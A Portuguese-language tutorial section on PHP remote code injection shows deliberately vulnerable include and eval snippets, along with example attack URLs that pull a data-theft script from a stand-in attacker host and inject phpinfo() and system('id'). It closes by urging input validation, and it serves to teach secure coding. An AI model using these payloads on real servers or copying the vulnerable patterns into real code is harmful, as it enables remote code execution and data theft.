# Remote Code Injection

Outra forma do invasor se aproveitar da confiança no usuário e no péssimo tratamento de dados de entrada e saída é com injeção de código, onde o script pode acabar executando código PHP sem validação.

Tome como exemplo o caso abaixo:

```php
<?php
ini_set('display_errors', true);
$page = $_GET['pagina'];
include $page;
```

Neste exemplo, basta a seguinte chamada para que um arquivo PHP externo seja executado no escopo da aplicação a ser atacada:
```php
http://localhost/teste/include.php?pagina=http://invasor.com.br/roubodedados.php
```

Outra forma de ataque consiste em se aproveitar do mal uso do comando eval.

```php
<?php
$nextPag = '?pagina=';
$pagina = $_GET['pagina'];
eval("$nextPag=$pagina;");
```

As chamadas abaixo executarão códigos para obter dados do servidor ou até mesmo executar comandos do seu sistema
```php
http://localhost/teste/seguranca1.php?pagina=teste.php; phpinfo();
http://localhost/teste/seguranca1.php?pagina=teste.php; system('id')
```

Mais uma vez é importante ressaltar a importância em não confiar no usuário e muito menos nos dados que serão enviados para o sistema, sendo essencial filtrar e validar todo dado de entrada e saída.